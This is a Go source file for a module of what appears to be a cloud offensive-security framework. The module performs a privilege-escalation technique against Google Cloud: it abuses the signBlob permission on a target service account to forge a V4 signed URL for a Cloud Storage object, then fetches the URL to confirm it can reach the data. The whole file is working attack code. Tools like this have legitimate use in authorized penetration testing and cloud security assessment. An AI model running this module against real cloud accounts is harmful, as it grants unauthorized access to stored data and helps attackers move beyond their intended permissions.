package iam

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	iamcredentials "google.golang.org/api/iamcredentials/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateSignBlobGCS{})
}

// EscalateSignBlobGCS generates a signed URL for a GCS object using signBlob.
type EscalateSignBlobGCS struct{}

func (m *EscalateSignBlobGCS) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-sign-blob-gcs",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Generate a signed URL for a GCS object using signBlob on a target service account",
		RequiresAuth: true,
	}
}

func (m *EscalateSignBlobGCS) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	bucket := ctx.Flags["bucket"]
	object := ctx.Flags["object"]

	if targetSA == "" || bucket == "" || object == "" {
		output.Warn("Usage: run privesc.iam.escalate-sign-blob-gcs --target-sa <email> --bucket <bucket> --object <object>")
		output.Info("Generates a signed URL that grants temporary access to a GCS object using the target SA's signing authority.")
		return nil
	}

	svc, err := iamcredentials.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create iamcredentials client: %w", err)
	}

	now := time.Now().UTC()
	datestamp := now.Format("20060102")
	datetime := now.Format("20060102T150405Z")
	expiresSeconds := 3600

	credentialScope := fmt.Sprintf("%s/auto/storage/goog4_request", datestamp)
	credential := fmt.Sprintf("%s/%s", targetSA, credentialScope)

	// Build canonical request for GCS signed URL (V4).
	canonicalURI := fmt.Sprintf("/%s/%s", bucket, object)
	canonicalQueryString := fmt.Sprintf(
		"X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=%s&X-Goog-Date=%s&X-Goog-Expires=%d&X-Goog-SignedHeaders=host",
		gcsURLEncode(credential), datetime, expiresSeconds,
	)
	canonicalHeaders := "host:storage.googleapis.com\n"
	signedHeaders := "host"

	canonicalRequest := strings.Join([]string{
		"GET",
		canonicalURI,
		canonicalQueryString,
		canonicalHeaders,
		signedHeaders,
		"UNSIGNED-PAYLOAD",
	}, "\n")

	// Build string to sign.
	hash := sha256.Sum256([]byte(canonicalRequest))
	stringToSign := strings.Join([]string{
		"GOOG4-RSA-SHA256",
		datetime,
		credentialScope,
		hex.EncodeToString(hash[:]),
	}, "\n")

	output.Info("Signing canonical request for gs://%s/%s via %s", bucket, object, targetSA)

	signResp, err := svc.Projects.ServiceAccounts.SignBlob(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamcredentials.SignBlobRequest{
			Payload: base64.StdEncoding.EncodeToString([]byte(stringToSign)),
		},
	).Do()
	if err != nil {
		return fmt.Errorf("signBlob failed: %w", err)
	}

	sigBytes, err := base64.StdEncoding.DecodeString(signResp.SignedBlob)
	if err != nil {
		return fmt.Errorf("decode signed blob: %w", err)
	}
	signature := hex.EncodeToString(sigBytes)

	signedURL := fmt.Sprintf(
		"https://storage.googleapis.com%s?%s&X-Goog-Signature=%s",
		canonicalURI, canonicalQueryString, signature,
	)

	output.Success("Signed URL generated")
	fmt.Printf("\n  %s\n\n", signedURL)

	// Verify the signed URL works.
	output.Info("Verifying signed URL with GET request...")
	resp, err := http.Get(signedURL)
	if err != nil {
		output.Warn("Verification request failed: %v", err)
	} else {
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			body, _ := io.ReadAll(resp.Body)
			output.Success("Signed URL is valid (HTTP %d, %d bytes)", resp.StatusCode, len(body))
		} else {
			output.Warn("Signed URL returned HTTP %d (may require correct permissions on the SA)", resp.StatusCode)
		}
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-sign-blob-gcs",
			Severity:    module.SevHigh,
			Title:       "Generated signed GCS URL via signBlob",
			Description: fmt.Sprintf("Created a signed URL for gs://%s/%s using %s signing authority", bucket, object, targetSA),
			Resource:    fmt.Sprintf("gs://%s/%s", bucket, object),
		}
	}

	return nil
}

func gcsURLEncode(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
			b.WriteByte(c)
		} else {
			fmt.Fprintf(&b, "%%%02X", c)
		}
	}
	return b.String()
}
